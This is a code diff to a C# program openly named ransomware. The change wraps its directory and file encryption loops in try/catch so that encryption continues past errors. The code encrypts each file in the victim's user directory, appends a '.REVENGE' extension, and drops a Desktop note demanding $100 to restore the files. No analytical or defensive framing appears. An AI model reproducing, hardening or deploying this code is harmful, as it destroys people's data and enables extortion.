@@ -50,15 +50,23 @@ namespace Ransomeware
 
             foreach(var folder in folders)
             {
-                encryptDirectory(folder);
+                try
+                {
+                    encryptDirectory(folder);
+                }catch { continue; }
             }
             //encrypting all files in the victim user directory .
             foreach (var file in directory)
             {
-                byte[] bytesEncrypted = Encrypt(File.ReadAllBytes(file), password);
-                File.WriteAllBytes(file, bytesEncrypted);
-                File.Move(file, file + ".REVENGE");
+                try
+                {
+                    byte[] bytesEncrypted = Encrypt(File.ReadAllBytes(file), password);
+                    File.WriteAllBytes(file, bytesEncrypted);
+                    File.Move(file, file + ".REVENGE");
+                }catch { continue; }
             }
+
+
 
 
             File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "//ReadToRestore.txt", @"if you want to restore your files, send me 100$");
